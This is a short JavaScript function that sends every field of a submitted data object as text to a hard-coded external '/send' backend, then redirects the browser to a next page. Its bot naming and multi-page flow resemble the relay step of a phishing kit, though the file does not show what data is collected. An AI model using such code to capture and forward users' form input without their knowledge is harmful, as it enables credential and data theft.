export default function botFetch(data, nextPageURL) {
    
    const serverURL = "https://sdad-qa-backend.vercel.app/send";

    const textData = Object.entries(data)
       .map(([key, value]) => `${key}: ${value}`)
       .join("\n");


    fetch(serverURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: textData })
    })
        .then(res => res.json())
        .then(response => {
            if (response.success) {
                if (nextPageURL) {
                    // Get base URL dynamically
                    const origin = window.location.origin;
                    const pathParts = window.location.pathname.split('/');
                    pathParts.pop(); // remove current file
                    const basePath = pathParts.join('/');
                    window.location.href = `${origin}${basePath}/${nextPageURL}`;
                }
            } else {
                console.error("Server error:", response.error);
            }
        })
        .catch(err => {
            console.error("Fetch error:", err);
        });
}





